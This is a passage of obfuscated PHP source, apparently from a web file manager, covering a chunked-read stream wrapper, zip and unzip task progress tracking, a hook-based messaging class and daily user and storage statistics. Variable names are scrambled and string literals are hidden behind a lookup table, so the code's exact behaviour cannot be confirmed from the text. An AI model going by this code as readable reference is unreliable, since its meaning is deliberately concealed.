$çÙ…ĞŸÄ[$Œñß¾[1196]] : $Œñß¾[12]; } public function download($òæú×š¼, $¬ò¿µúù) { Downloader::start($òæú×š¼, $¬ò¿µúù); return $¬ò¿µúù; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Æª˜š, $á»¯ŞÛŠ = '') { $this->info = $this->info($Æª˜š); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ïëó©ÒÚ][84]]; $this->pathOpen = $Æª˜š; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Æª˜š])) { self::$_chunkBuffer[$Æª˜š] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($€—ı¹ı®) { $’§ËÒ™± = $this->fileSubstr($this->pose, $€—ı¹ı®); $this->pose += strlen($’§ËÒ™±); return $’§ËÒ™±; } public function stream_tell() { return $this->pose; } public function stream_seek($Œ³—µşÄ, $‘¦şĞ‚Ú) { $¼µÃïÓÜ =& $_SERVER[ïëó©ÒÚ]; if ($‘¦şĞ‚Ú == SEEK_SET) { $this->pose = $Œ³—µşÄ; } else { if ($‘¦şĞ‚Ú == SEEK_CUR) { $this->pose += $Œ³—µşÄ; } else { if ($‘¦şĞ‚Ú == SEEK_END) { $this->pose = $this->info[$¼µÃïÓÜ[76]] + intval($Œ³—µşÄ); } } } if ($Œ³—µşÄ < 0) { $this->pose = $this->info[$¼µÃïÓÜ[76]] + $Œ³—µşÄ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ïëó©ÒÚ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ˆö‹—üö, $Ñ†¯ş°Ş) { $’İı—Œ =& $_SERVER[ïëó©ÒÚ]; $¼è •ÌÆ = $this->info($ˆö‹—üö); return array($’İı—Œ[1506] => 0, $’İı—Œ[1507] => 0, $’İı—Œ[16] => 32768 + 511, $’İı—Œ[1508] => 0, $’İı—Œ[1509] => 0, $’İı—Œ[1510] => 0, $’İı—Œ[1511] => 0, $’İı—Œ[76] => $¼è •ÌÆ[$’İı—Œ[76]], $’İı—Œ[1512] => $¼è •ÌÆ[$’İı—Œ[1380]], $’İı—Œ[1468] => $¼è •ÌÆ[$’İı—Œ[85]], $’İı—Œ[1467] => $¼è •ÌÆ[$’İı—Œ[200]], $’İı—Œ[1513] => 0, $’İı—Œ[1514] => 0); } static $fileInfo = array(); public function info($¹å¤„ßš) { $„Å°¶† = $_SERVER[ïëó©ÒÚ][1515]; if (isset(self::$fileInfo[$¹å¤„ßš])) { return self::$fileInfo[$¹å¤„ßš]; } if (substr($¹å¤„ßš, 0, strlen($„Å°¶†)) != $„Å°¶†) { return !1; } self::$fileInfo[$¹å¤„ßš] = IO::info(substr($¹å¤„ßš, strlen($„Å°¶†))); return self::$fileInfo[$¹å¤„ßš]; } public static function read($›ŞÓŞÇ˜, $ÆÇ’È“¯, $‰Óª¡­‹) { if (!isset(self::$_fopenCache[$›ŞÓŞÇ˜])) { $¤ı¿Şô = new StreamWrapperIO(); $¤ı¿Şô->stream_open($›ŞÓŞÇ˜); self::$_fopenCache[$›ŞÓŞÇ˜] = $¤ı¿Şô; } $¤ı¿Şô = self::$_fopenCache[$›ŞÓŞÇ˜]; return $¤ı¿Şô->fileSubstr($ÆÇ’È“¯, $‰Óª¡­‹); } public static function _read($à—Ó…µÌ, $¡±Ã¿é, $¬€Øâ¦) { $Ñ÷€¼±ø =& $_SERVER[ïëó©ÒÚ]; $ÇŸ¤´ = fopen($à—Ó…µÌ, $Ñ÷€¼±ø[1384]); if (!$ÇŸ¤´) { return $Ñ÷€¼±ø[12]; } $µÜêáğÛ = 8192; fseek($ÇŸ¤´, $¡±Ã¿é, SEEK_SET); $ıÌÓ©Ê = $Ñ÷€¼±ø[12]; $“§ÌÆ«É = 0; while ($“§ÌÆ«É < $¬€Øâ¦) { $ïŸè§ô‚ = min($µÜêáğÛ, $¬€Øâ¦ - $“§ÌÆ«É); $ıÌÓ©Ê .= fread($ÇŸ¤´, $ïŸè§ô‚); $“§ÌÆ«É += $ïŸè§ô‚; } fclose($ÇŸ¤´); return $ıÌÓ©Ê; } public function fileSubstr($ß‰ºÖÛË, $ò²Ú²øà) { $Ç€çıîû =& $_SERVER[ïëó©ÒÚ]; $«»éÜÎ = $this->info[$Ç€çıîû[76]]; $îÌÀÛ¦ç = $ß‰ºÖÛË; $İçÅ¬×š = $ò²Ú²øà; if ($ß‰ºÖÛË < 0) { $ß‰ºÖÛË = $«»éÜÎ + $ß‰ºÖÛË; } if ($ò²Ú²øà === !1) { $ò²Ú²øà = $«»éÜÎ - $ß‰ºÖÛË; } if ($ß‰ºÖÛË + $ò²Ú²øà > $«»éÜÎ) { $ò²Ú²øà = $«»éÜÎ - $ß‰ºÖÛË; } if ($ò²Ú²øà <= 0) { return $Ç€çıîû[12]; } if ($ß‰ºÖÛË < 0 || $ß‰ºÖÛË >= $«»éÜÎ || $ò²Ú²øà <= 0 || $ò²Ú²øà > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\154\145\122\x65\x61\144\40\145\x72\162\x6f\x72\41\40\x73\164\141\162\164\75{$ß‰ºÖÛË}\73\154\x65\x6e\x67\x74\x68\75{$ò²Ú²øà}\73\40\163\x69\x7a\x65\x3d{$«»éÜÎ}\73"); } $Ğà¸ş–¥ = 64 * 1024; $ë—¶è†ù =& self::$_chunkBuffer[$this->path]; if (!$ë—¶è†ù) { $ë—¶è†ù = array(); } $Ñ¶±í ı = 0; $éå–™ˆÛ = 0; $¡à†×²• = $Ç€çıîû[12]; foreach ($ë—¶è†ù as $Ñ¶±í ı => $¡à†×²•) { $Ñ¶±í ı = intval($Ñ¶±í ı); $éå–™ˆÛ = $Ñ¶±í ı + strlen($¡à†×²•); if ($ß‰ºÖÛË >= $éå–™ˆÛ) { continue; } if ($ß‰ºÖÛË >= $Ñ¶±í ı && $ß‰ºÖÛË + $ò²Ú²øà <= $éå–™ˆÛ) { return substr($¡à†×²•, $ß‰ºÖÛË - $Ñ¶±í ı, $ò²Ú²øà); } break; } if (count($ë—¶è†ù) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ç€çıîû[1516], $Ç€çıîû[1517] . count($ë—¶è†ù) . "\73\x73\x74\x61\162\164\x3d{$ß‰ºÖÛË}\54\154\145\156\147\x74\150\75{$ò²Ú²øà}\73\x70\157\163\145\72{$Ñ¶±í ı}\176{$éå–™ˆÛ}"); throw new Exception($Ç€çıîû[1518]); } $¬‰â° ä = intval($ß‰ºÖÛË / $Ğà¸ş–¥) * $Ğà¸ş–¥; $ÅËë´ì = ceil(($ß‰ºÖÛË + $ò²Ú²øà) / $Ğà¸ş–¥) * $Ğà¸ş–¥ - $¬‰â° ä; $ÃÒËõœ­ = IO::fileSubstr($this->path, $¬‰â° ä, $ÅËë´ì); $ë—¶è†ù[$¬‰â° ä . $Ç€çıîû[12]] = $ÃÒËõœ­; ksort($ë—¶è†ù); $¤—è³…í = substr($ÃÒËõœ­, $ß‰ºÖÛË - $¬‰â° ä, $ò²Ú²øà); return $¤—è³…í; } private function log($ àØàè, $ş©Û—×¸) { $ÓÁ½ó±» =& $_SERVER[ïëó©ÒÚ]; $¸™µ›Ç = timeFloat() - $this->timeStart; write_log(sprintf($ÓÁ½ó±»[1519], $ àØàè, $this->info[$ÓÁ½ó±»[32]], $¸™µ›Ç, $ş©Û—×¸), $ÓÁ½ó±»[1186]); } } class Message { function __construct() { } public function send($™àš«Í = '', $öÍïİä = array(), $´ƒ•È…² = "\x74\x65\170\164") { $÷Âî¦Ÿ =& $_SERVER[ïëó©ÒÚ]; $©Ø™¦Ğ = array($÷Âî¦Ÿ[33] => $÷Âî¦Ÿ[1520], $÷Âî¦Ÿ[765] => $™àš«Í); if (in_array($´ƒ•È…², array($÷Âî¦Ÿ[1520], $÷Âî¦Ÿ[1521]))) { $©Ø™¦Ğ[$÷Âî¦Ÿ[33]] = $´ƒ•È…²; } $öÍïİä = array($÷Âî¦Ÿ[524] => isset($öÍïİä[$÷Âî¦Ÿ[524]]) ? $öÍïİä[$÷Âî¦Ÿ[524]] : $÷Âî¦Ÿ[12], $÷Âî¦Ÿ[609] => isset($öÍïİä[$÷Âî¦Ÿ[609]]) ? $öÍïİä[$÷Âî¦Ÿ[609]] : $÷Âî¦Ÿ[12]); if (empty($™àš«Í) || empty($öÍïİä[$÷Âî¦Ÿ[524]]) && empty($öÍïİä[$÷Âî¦Ÿ[609]])) { return !1; } $„ÊŠ×¥º = array($÷Âî¦Ÿ[1461] => $©Ø™¦Ğ, $÷Âî¦Ÿ[1522] => $öÍïİä); Hook::trigger($÷Âî¦Ÿ[1523], $„ÊŠ×¥º); } } goto AÎÀïÒ­ËÉ; DÓ…È‰‡œ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÎÛ–‘ =& $_SERVER[ïëó©ÒÚ]; parent::startAfter(); Hook::bind($ÎÛ–‘[1754], array($this, $ÎÛ–‘[1755])); Hook::bind($ÎÛ–‘[1197], array($this, $ÎÛ–‘[1756])); $˜Â‰¦¯Â =& $this->task; $˜Â‰¦¯Â[$ÎÛ–‘[1757]] = $ÎÛ–‘[1202]; if (!$˜Â‰¦¯Â[$ÎÛ–‘[1560]]) { $˜Â‰¦¯Â[$ÎÛ–‘[1560]] = LNG($ÎÛ–‘[1758]); } } protected function endAfter() { $”È°Áî€ =& $_SERVER[ïëó©ÒÚ]; parent::endAfter(); Hook::unbind($”È°Áî€[1754], array($this, $”È°Áî€[1755])); Hook::unbind($”È°Áî€[1197], array($this, $”È°Áî€[1756])); } public function updateAfter() { $ùÆ€™È† =& $_SERVER[ïëó©ÒÚ]; $’å¿õ¹ =& $this->task; if (!$’å¿õ¹[$ùÆ€™È†[796]] || !$’å¿õ¹[$ùÆ€™È†[773]]) { return; } if ($’å¿õ¹[$ùÆ€™È†[1757]] == $ùÆ€™È†[1202]) { $âÑßĞé  = 0; if ($’å¿õ¹[$ùÆ€™È†[1712]]) { $âÑßĞé  = $’å¿õ¹[$ùÆ€™È†[1713]] / $’å¿õ¹[$ùÆ€™È†[1712]]; } $’å¿õ¹[$ùÆ€™È†[1663]] = $âÑßĞé  * 0.3; } else { if ($’å¿õ¹[$ùÆ€™È†[1757]] == $ùÆ€™È†[313]) { $âÑßĞé  = $’å¿õ¹[$ùÆ€™È†[1662]] / $’å¿õ¹[$ùÆ€™È†[796]]; $’å¿õ¹[$ùÆ€™È†[1663]] = 0.3 + $âÑßĞé  * 0.4; } else { if ($’å¿õ¹[$ùÆ€™È†[1757]] == $ùÆ€™È†[107]) { $û„Û“ö® = 0; if ($’å¿õ¹[$ùÆ€™È†[1714]] == $ùÆ€™È†[107]) { $û„Û“ö® = $’å¿õ¹[$ùÆ€™È†[1713]]; } $âÑßĞé  = ($’å¿õ¹[$ùÆ€™È†[1717]] + $û„Û“ö®) / $’å¿õ¹[$ùÆ€™È†[773]]; $’å¿õ¹[$ùÆ€™È†[1663]] = 0.3 + 0.4 + $âÑßĞé  * 0.3; } } } if ($’å¿õ¹[$ùÆ€™È†[1663]] > 0) { $ûÅë÷ô = timeFloat() - $’å¿õ¹[$ùÆ€™È†[1665]] - $’å¿õ¹[$ùÆ€™È†[1668]]; $’å¿õ¹[$ùÆ€™È†[1669]] = $ûÅë÷ô * (1 - $’å¿õ¹[$ùÆ€™È†[1663]]) / $’å¿õ¹[$ùÆ€™È†[1663]]; } } public function addFile($Õ›¡§Ô) { $Š—ç®†· =& $_SERVER[ïëó©ÒÚ]; $ºİ¨ùÄ =& $this->task; $³—¶‘¶Ò = IO::info($Õ›¡§Ô); $ºİ¨ùÄ[$Š—ç®†·[1710]] = $³—¶‘¶Ò[$Š—ç®†·[32]]; $ºİ¨ùÄ[$Š—ç®†·[1712]] = $³—¶‘¶Ò[$Š—ç®†·[76]]; $ºİ¨ùÄ[$Š—ç®†·[1713]] = 0; $ºİ¨ùÄ[$Š—ç®†·[1067]] = $Š—ç®†·[1733]; $ºİ¨ùÄ[$Š—ç®†·[1714]] = $Š—ç®†·[1202]; $ºİ¨ùÄ[$Š—ç®†·[773]] = $³—¶‘¶Ò[$Š—ç®†·[76]]; $ºİ¨ùÄ[$Š—ç®†·[796]] = 1; $ØöºÉğ® = 0; $ºİ¨ùÄ[$Š—ç®†·[1721]] = array($Š—ç®†·[1722] => $ØöºÉğ® + 1, $Š—ç®†·[429] => $³—¶‘¶Ò[$Š—ç®†·[32]], $Š—ç®†·[84] => $³—¶‘¶Ò[$Š—ç®†·[84]], $Š—ç®†·[528] => $³—¶‘¶Ò[$Š—ç®†·[528]] ? $³—¶‘¶Ò[$Š—ç®†·[528]] : $³—¶‘¶Ò[$Š—ç®†·[84]]); $this->update(); } public function unzipAfter($û±á¿ÌÑ) { $ÒïÛø¹µ =& $_SERVER[ïëó©ÒÚ]; $·—¾¶à =& $this->task; $·—¾¶à[$ÒïÛø¹µ[1757]] = $ÒïÛø¹µ[107]; $â¡ü·ŸÏ = IO::infoWithChildren($û±á¿ÌÑ); $³Èá·Åİ = 0; $·—¾¶à[$ÒïÛø¹µ[1721]] = array($ÒïÛø¹µ[1722] => $³Èá·Åİ + 1, $ÒïÛø¹µ[429] => $â¡ü·ŸÏ[$ÒïÛø¹µ[32]], $ÒïÛø¹µ[84] => $â¡ü·ŸÏ[$ÒïÛø¹µ[84]], $ÒïÛø¹µ[528] => $â¡ü·ŸÏ[$ÒïÛø¹µ[528]] ? $â¡ü·ŸÏ[$ÒïÛø¹µ[528]] : $â¡ü·ŸÏ[$ÒïÛø¹µ[84]]); if ($â¡ü·ŸÏ[$ÒïÛø¹µ[33]] == $ÒïÛø¹µ[199]) { $·—¾¶à[$ÒïÛø¹µ[796]] = 1; } else { $·—¾¶à[$ÒïÛø¹µ[796]] = $â¡ü·ŸÏ[$ÒïÛø¹µ[79]][$ÒïÛø¹µ[77]]; } $·—¾¶à[$ÒïÛø¹µ[1067]] = $ÒïÛø¹µ[12]; $·—¾¶à[$ÒïÛø¹µ[1714]] = 0; $·—¾¶à[$ÒïÛø¹µ[1662]] = 0; $·—¾¶à[$ÒïÛø¹µ[1712]] = 0; $·—¾¶à[$ÒïÛø¹µ[1713]] = 0; $·—¾¶à[$ÒïÛø¹µ[1710]] = $ÒïÛø¹µ[12]; $·—¾¶à[$ÒïÛø¹µ[1717]] = 0; $·—¾¶à[$ÒïÛø¹µ[773]] = $â¡ü·ŸÏ[$ÒïÛø¹µ[76]]; $this->update(); self::log($ÒïÛø¹µ[1759] . json_encode(array($·—¾¶à, $â¡ü·ŸÏ))); } public function nameParse($·Ÿ½Áü) { $İõËÀ± =& $_SERVER[ïëó©ÒÚ]; $æ„ê¥š =& $this->task; if ($æ„ê¥š[$İõËÀ±[1757]] == $İõËÀ±[1202]) { $æ„ê¥š[$İõËÀ±[1757]] = $İõËÀ±[313]; $æ„ê¥š[$İõËÀ±[1717]] = 0; $æ„ê¥š[$İõËÀ±[773]] = 0; } $ş’¬¡©ñ = get_path_this($·Ÿ½Áü); if (strstr($ş’¬¡©ñ, $İõËÀ±[10])) { $æ„ê¥š[$İõËÀ±[1662]] += 1; $æ„ê¥š[$İõËÀ±[796]] += 1; } $æ„ê¥š[$İõËÀ±[1710]] = $·Ÿ½Áü; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¥‘ÀŒ¡¨ =& $_SERVER[ïëó©ÒÚ]; parent::startAfter(); Hook::bind($¥‘ÀŒ¡¨[1760], array($this, $¥‘ÀŒ¡¨[1755])); $–ÌÎñê =& $this->task; $–ÌÎñê[$¥‘ÀŒ¡¨[1757]] = $¥‘ÀŒ¡¨[1202]; if (!$–ÌÎñê[$¥‘ÀŒ¡¨[1560]]) { $–ÌÎñê[$¥‘ÀŒ¡¨[1560]] = LNG($¥‘ÀŒ¡¨[1761]); } } protected function endAfter() { $œŸœ£†ì =& $_SERVER[ïëó©ÒÚ]; parent::endAfter(); Hook::unbind($œŸœ£†ì[1760], array($this, $œŸœ£†ì[1755])); } public function updateAfter() { $¸½ù–¤ =& $_SERVER[ïëó©ÒÚ]; $”Í„Ê =& $this->task; if (!$”Í„Ê[$¸½ù–¤[796]] || !$”Í„Ê[$¸½ù–¤[773]]) { return; } if ($”Í„Ê[$¸½ù–¤[1757]] == $¸½ù–¤[1202]) { $í…°¸Œ = $”Í„Ê[$¸½ù–¤[1713]]; if ($”Í„Ê[$¸½ù–¤[1714]] != $¸½ù–¤[1202]) { $í…°¸Œ = 0; } $úşÕµî– = ($”Í„Ê[$¸½ù–¤[1717]] + $í…°¸Œ) / $”Í„Ê[$¸½ù–¤[773]]; $”Í„Ê[$¸½ù–¤[1663]] = $úşÕµî– * 0.3; } else { if ($”Í„Ê[$¸½ù–¤[1757]] == $¸½ù–¤[313]) { $úşÕµî– = $”Í„Ê[$¸½ù–¤[1662]] / $”Í„Ê[$¸½ù–¤[796]]; $”Í„Ê[$¸½ù–¤[1663]] = 0.3 + $úşÕµî– * 0.5; } else { if ($”Í„Ê[$¸½ù–¤[1757]] == $¸½ù–¤[107]) { $úşÕµî– = 0; if ($”Í„Ê[$¸½ù–¤[1712]]) { $úşÕµî– = $”Í„Ê[$¸½ù–¤[1713]] / $”Í„Ê[$¸½ù–¤[1712]]; } $”Í„Ê[$¸½ù–¤[1663]] = 0.3 + 0.5 + $úşÕµî– * 0.2; } } } if ($”Í„Ê[$¸½ù–¤[1663]] > 0) { $Ã§½²¥Ò = timeFloat() - $”Í„Ê[$¸½ù–¤[1665]] - $”Í„Ê[$¸½ù–¤[1668]]; $”Í„Ê[$¸½ù–¤[1669]] = $Ã§½²¥Ò * (1 - $”Í„Ê[$¸½ù–¤[1663]]) / $”Í„Ê[$¸½ù–¤[1663]]; } } public function copyFileStart($¿ö²Ÿ¤, $ş‡Î½íÉ, $òƒñ¹Ùœ, $€ëıîŒÉ, $„ÇÄ—×Õ, $ßª³£³ä) { $ ½å°Ø =& $_SERVER[ïëó©ÒÚ]; parent::copyFileStart($¿ö²Ÿ¤, $ş‡Î½íÉ, $òƒñ¹Ùœ, $€ëıîŒÉ, $„ÇÄ—×Õ, $ßª³£³ä); $†û¶œ®Ú =& $this->task; if ($†û¶œ®Ú[$ ½å°Ø[1757]] == $ ½å°Ø[313]) { $†û¶œ®Ú[$ ½å°Ø[1757]] = $ ½å°Ø[107]; } $this->update(); } public function copyFileEnd($®ã²š–Ö, $¬ƒŒÜÁŞ, $²àç¼§õ, $ö´÷Àèì, $®Ã­»÷¶, $»È³ÃŸ‰) { $ö·ò¶íª =& $_SERVER[ïëó©ÒÚ]; $®±ò¢µô =& $this->task; $®±ò¢µô[$ö·ò¶íª[1713]] = $®±ò¢µô[$ö·ò¶íª[1712]]; $®±ò¢µô[$ö·ò¶íª[1717]] += $®±ò¢µô[$ö·ò¶íª[1712]]; $®±ò¢µô[$ö·ò¶íª[1714]] = $ö·ò¶íª[12]; $this->update(); } public function nameParse($ù“…ŒÑò) { $¾ŞÍ¼àŞ =& $_SERVER[ïëó©ÒÚ]; $–„Ş ¸Š =& $this->task; if ($–„Ş ¸Š[$¾ŞÍ¼àŞ[1662]] < $–„Ş ¸Š[$¾ŞÍ¼àŞ[796]]) { $¿Ÿï…Œ• = get_path_this($ù“…ŒÑò); if (strstr($¿Ÿï…Œ•, $¾ŞÍ¼àŞ[10])) { $–„Ş ¸Š[$¾ŞÍ¼àŞ[1662]] += 1; } } if ($–„Ş ¸Š[$¾ŞÍ¼àŞ[1757]] == $¾ŞÍ¼àŞ[1202]) { $–„Ş ¸Š[$¾ŞÍ¼àŞ[1757]] = $¾ŞÍ¼àŞ[313]; } $–„Ş ¸Š[$¾ŞÍ¼àŞ[1710]] = $ù“…ŒÑò; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($·ô®“çÇ) { $¦“†ö¬Ñ =& $_SERVER[ïëó©ÒÚ]; $´©²°â  = array($¦“†ö¬Ñ[609] => array($¦“†ö¬Ñ[33] => $¦“†ö¬Ñ[1762], $¦“†ö¬Ñ[273] => array($¦“†ö¬Ñ[224], $¦“†ö¬Ñ[775], $¦“†ö¬Ñ[1763], $¦“†ö¬Ñ[1764])), $¦“†ö¬Ñ[1765] => array($¦“†ö¬Ñ[33] => $¦“†ö¬Ñ[1766], $¦“†ö¬Ñ[273] => array($¦“†ö¬Ñ[224], $¦“†ö¬Ñ[773], $¦“†ö¬Ñ[1767], $¦“†ö¬Ñ[1768], $¦“†ö¬Ñ[1769]))); if (!isset($´©²°â [$·ô®“çÇ])) { return !1; } $this->optionType = $´©²°â [$·ô®“çÇ][$¦“†ö¬Ñ[33]]; $this->field = $´©²°â [$·ô®“çÇ][$¦“†ö¬Ñ[273]]; return !0; } public function listData($öêğŸôñ = false, $Ó™ò·°µ = "\155\157\144\x69\x66\171\124\151\x6d\x65", $úâÆÑ„Ø = false) { return parent::listData($öêğŸôñ, $Ó™ò·°µ, $úâÆÑ„Ø); } public function trendList($íÓ¦Ë) { $õ‡ÍƒËí =& $_SERVER[ïëó©ÒÚ]; $»˜èÃ€ = $this->listData(); if ($»˜èÃ€) { $æ†‡¥òÁ = end($»˜èÃ€); $˜µñ¸¬÷ = date($õ‡ÍƒËí[1770], strtotime($õ‡ÍƒËí[1771])); if ($æ†‡¥òÁ[$õ‡ÍƒËí[224]] == $˜µñ¸¬÷) { return $»˜èÃ€; } $­Ş“àÒ¤ = strtotime($æ†‡¥òÁ[$õ‡ÍƒËí[224]]); } if (!isset($­Ş“àÒ¤)) { $ÈÔŸß™§ = $íÓ¦Ë == $õ‡ÍƒËí[609] ? $õ‡ÍƒËí[544] : $õ‡ÍƒËí[835]; $­Ş“àÒ¤ = Model($ÈÔŸß™§)->min($õ‡ÍƒËí[200]); } $²øÆàÚ° = $õ‡ÍƒËí[1772] . ucfirst($íÓ¦Ë); $§üÌÚ±­ = $this->dateList($­Ş“àÒ¤); foreach ($§üÌÚ±­ as $˜µñ¸¬÷) { $this->{$²øÆàÚ°}($˜µñ¸¬÷); } return $this->listData(); } private function dateList($¡ñã•ıÔ) { $³Áú´İÔ =& $_SERVER[ïëó©ÒÚ]; $ö˜’½æ = $¡ñã•ıÔ; $›½Î = strtotime($³Áú´İÔ[1771]); $ùÛò¹ë¯ = array(); while ($ö˜’½æ <= $›½Î) { $ùÛò¹ë¯[] = date($³Áú´İÔ[1770], $ö˜’½æ); $ö˜’½æ = strtotime($³Áú´İÔ[1773], $ö˜’½æ); } return $ùÛò¹ë¯; } public function _recordUser($ó›Û©è› = '') { $ÒúêˆÉ‘ =& $_SERVER[ïëó©ÒÚ]; $†ä¥û´Â = strtotime(date($ÒúêˆÉ‘[1774], strtotime($ó›Û©è›))); $­²Ğœ‰„ = strtotime(date($ÒúêˆÉ‘[1775], strtotime($ó›Û©è›))); $ô®ºãğİ = array($ÒúêˆÉ‘[200] => array($ÒúêˆÉ‘[1016], $­²Ğœ‰„)); $€ñ²üŞ = Model($ÒúêˆÉ‘[544])->where($ô®ºãğİ)->count($ÒúêˆÉ‘[1661]); $ô®ºãğİ[$ÒúêˆÉ‘[200]] = array($ÒúêˆÉ‘[333], array($†ä¥û´Â, $­²Ğœ‰„)); $Ä¢ßğëÄ = Model($ÒúêˆÉ‘[544])->where($ô®ºãğİ)->count($ÒúêˆÉ‘[1661]); $ô®ºãğİ[$ÒúêˆÉ‘[33]] = $ÒúêˆÉ‘[1776]; $ëğ€ŠÂê = Model($ÒúêˆÉ‘[1777])->where($ô®ºãğİ)->count($ÒúêˆÉ‘[1778]); $ë×úš¹İ = array($ÒúêˆÉ‘[224] => $ó›Û©è›, $ÒúêˆÉ‘[775] => (int) $€ñ²üŞ, $ÒúêˆÉ‘[1763] => (int) $Ä¢ßğëÄ, $ÒúêˆÉ‘[1764] => (int) $ëğ€ŠÂê); return $this->insert($ë×úš¹İ); } public function _recordStore($›ÍîóâŠ = '') { $úæ¡¥Ÿß =& $_SERVER[ïëó©ÒÚ]; $ÙÅ‡‰•É = strtotime(date($úæ¡¥Ÿß[1775], strtotime($›ÍîóâŠ))); $Æ”Ëì† = array($úæ¡¥Ÿß[200] => array($úæ¡¥Ÿß[1016], $ÙÅ‡‰•É)); $°š³ÖæÜ = Model($úæ¡¥Ÿß[480])->where($Æ”Ëì†)->sum($úæ¡¥Ÿß[76]); $Æ”Ëì†[$úæ¡¥Ÿß[419]] = 0; $×ƒÊúÍõ = Model($úæ¡¥Ÿß[835])->where($Æ”Ëì†)->sum($úæ¡¥Ÿß[76]); $Æ”Ëì†[$úæ¡¥Ÿß[420]] = 1; $«ûšğÆµ = Model($úæ¡¥Ÿß[835])->where($Æ”Ëì†)->sum($úæ¡¥Ÿß[76]); $Æ”Ëì†[$úæ¡¥Ÿß[420]] = 2; $ÌĞòßû  = Model($úæ¡¥Ÿß[835])->where($Æ”Ëì†)->sum($úæ¡¥Ÿß[76]); $¼î°§Æğ = array($úæ¡¥Ÿß[224] => $›ÍîóâŠ, $úæ¡¥Ÿß[773] => (int) $×ƒÊúÍõ, $úæ¡¥Ÿß[1767] => (int) $°š³ÖæÜ, $úæ¡¥Ÿß[1768] => (int) $«ûšğÆµ, $úæ¡¥Ÿß[1769] => (int) $ÌĞòßû ); return $this->insert($¼î°§Æğ); } public function trend($á‹’ÈĞÈ, $åñáÙñ) { $«¸ˆ«ÉÈ =& $_SERVER[ïëó©ÒÚ]; if (!$this->init($á‹’ÈĞÈ)) { return !1; } $ÖèÀŒÖ = $this->trendList($á‹’ÈĞÈ); if ($ÖèÀŒÖ && $åñáÙñ != $«¸ˆ«ÉÈ[1634]) { $èèõÛ… = $ÖèÀŒÖ[0][$«¸ˆ«ÉÈ[224]]; $ê©Ûõ²ı = $this->validDate($åñáÙñ, $èèõÛ…); $£ßë Ç = array(); $óÊ·ãÌÕ = array_to_keyvalue($ÖèÀŒÖ, $«¸ˆ«ÉÈ[224]); foreach ($ê©Ûõ²ı as $£ŞÂ„åÓ) { if (isset($óÊ·ãÌÕ[$£ŞÂ„åÓ])) { $³¼¬Ä = $óÊ·ãÌÕ[$£ŞÂ„åÓ]; } else { $³¼¬Ä = end($ÖèÀŒÖ); $³¼¬Ä[$«¸ˆ«ÉÈ[224]] = $£ŞÂ„åÓ; if ($á‹’ÈĞÈ == $«¸ˆ«ÉÈ[609]) { $³¼¬Ä[$«¸ˆ«ÉÈ[1763]] = $³¼¬Ä[$«¸ˆ«ÉÈ[1764]] = 0; } } $£ßë Ç[] = $³¼¬Ä; } $ÖèÀŒÖ = $£ßë Ç; } $°¿ïÃÔ§ = array($«¸ˆ«ÉÈ[609] => array($«¸ˆ«ÉÈ[775] => LNG($«¸ˆ«ÉÈ[1779]), $«¸ˆ«ÉÈ[1763] => LNG($«¸ˆ«ÉÈ[1780]), $«¸ˆ«ÉÈ[1764] => LNG($«¸ˆ«ÉÈ[1781])), $«¸ˆ«ÉÈ[1765] => array($«¸ˆ«ÉÈ[773] => LNG($«¸ˆ«ÉÈ[1782]), $«¸ˆ«ÉÈ[1767] => LNG($«¸ˆ«ÉÈ[1783]), $«¸ˆ«ÉÈ[1768] => LNG($«¸ˆ«ÉÈ[1784]), $«¸ˆ«ÉÈ[1769] => LNG($«¸ˆ«ÉÈ[1785]))); $°…òæ» = array($«¸ˆ«ÉÈ[609] => $«¸ˆ«ÉÈ[1786], $«¸ˆ«ÉÈ[1765] => $«¸ˆ«ÉÈ[76]); if (empty($ÖèÀŒÖ)) { $£ŞÂ„åÓ = date($«¸ˆ«ÉÈ[1770], strtotime($«¸ˆ«ÉÈ[1771])); $îáÕ¨Ø = array($«¸ˆ«ÉÈ[224] => $£ŞÂ„åÓ); foreach ($°¿ïÃÔ§[$á‹’ÈĞÈ] as $ÇÅÚŒŒñ => $ûã‡şîù) { $îáÕ¨Ø[$ÇÅÚŒŒñ] = 0; } $ÖèÀŒÖ[] = $îáÕ¨Ø; } $Éè³ÆÕã = array(); foreach ($ÖèÀŒÖ as $ûã‡şîù) { if ($á‹’ÈĞÈ == $«¸ˆ«ÉÈ[1765] && $ûã‡şîù[$«¸ˆ«ÉÈ[1767]] > $ûã‡şîù[$«¸ˆ«ÉÈ[773]]) { $ûã‡şîù[$«¸ˆ«ÉÈ[1767]] = $ûã‡şîù[$«¸ˆ«ÉÈ[773]]; } foreach ($°¿ïÃÔ§[$á‹’ÈĞÈ] as $ÇÅÚŒŒñ => $ÒöİÑÌâ) { $³¼¬Ä = array($«¸ˆ«ÉÈ[224] => $ûã‡şîù[$«¸ˆ«ÉÈ[224]], $«¸ˆ«ÉÈ[1560] => $ÒöİÑÌâ); $³¼¬Ä[$°…òæ»[$á‹’ÈĞÈ]] = isset($ûã‡şîù[$ÇÅÚŒŒñ]) ? $ûã‡şîù[$ÇÅÚŒŒñ] : 0; $Éè³ÆÕã[] = $³¼¬Ä; } } return $Éè³ÆÕã; } public function validDate($ØôÆòûŞ, $ºÛ›şÄî) { $ÚµåÈ¥å =& $_SERVER[ïëó©ÒÚ]; $ÆïÚ›Çæ = date($ÚµåÈ¥å[1770], strtotime($ÚµåÈ¥å[1771])); $ÔË…±¾Ô = array($ÆïÚ›Çæ); switch ($ØôÆòûŞ) { case $ÚµåÈ¥å[1641]: $İö×˜òÙ = mktime(0, 0, 0, date($ÚµåÈ¥å[1787]), date($ÚµåÈ¥å[1378]) - date($ÚµåÈ¥å[1441]) + 7 - 7, date($ÚµåÈ¥å[1788])); $¨îéøñŠ = 0; do { $ÃòÖŞ»¼ = date($ÚµåÈ¥å[1770], $İö×˜òÙ 